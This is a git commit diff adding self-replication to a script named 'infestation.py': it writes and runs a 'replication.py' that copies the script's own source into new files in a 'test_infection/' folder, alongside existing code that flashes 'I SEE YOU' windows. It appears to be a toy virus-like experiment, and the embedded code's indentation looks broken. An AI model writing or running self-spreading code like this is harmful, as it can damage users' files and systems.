001484960cb2e6a4c1a5539caf455476420b18ce
Dorian Delorme <doriandelorme@outlook.fr>
2023-02-23 12:02:33 +0100

    script write its own replication script

--- infestation.py
+++ infestation.py
@@ -30,4 +30,24 @@ for i in range(15):
     cv2.waitKey(800)
     cv2.destroyWindow("I SEE YOU" + str(i-3))
 
+with open("replication.py", "w") as f:
+    f.write('''
+    import os
+
+    # ouvrir le fichier source
+    with open('infestation.py', 'r') as f:
+        source_code = f.read()
+
+    # spécifiez le chemin d'accès au dossier pour écrire les fichiers
+    folder_path = "test_infection/"
+
+    # parcourir tous les fichiers du dossier
+    for i, filename in enumerate(os.listdir(folder_path)):
+        # vérifiez que le fichier est un fichier Python
+        if filename.endswith(".py"):
+            # ouvrir le fichier et écrire le code source
+            with open(os.path.join(folder_path, f"infestation_{i}.py"), 'w') as f:
+                f.write(source_code)
+    ''')
+
 subprocess.run(["python", "replication.py"])
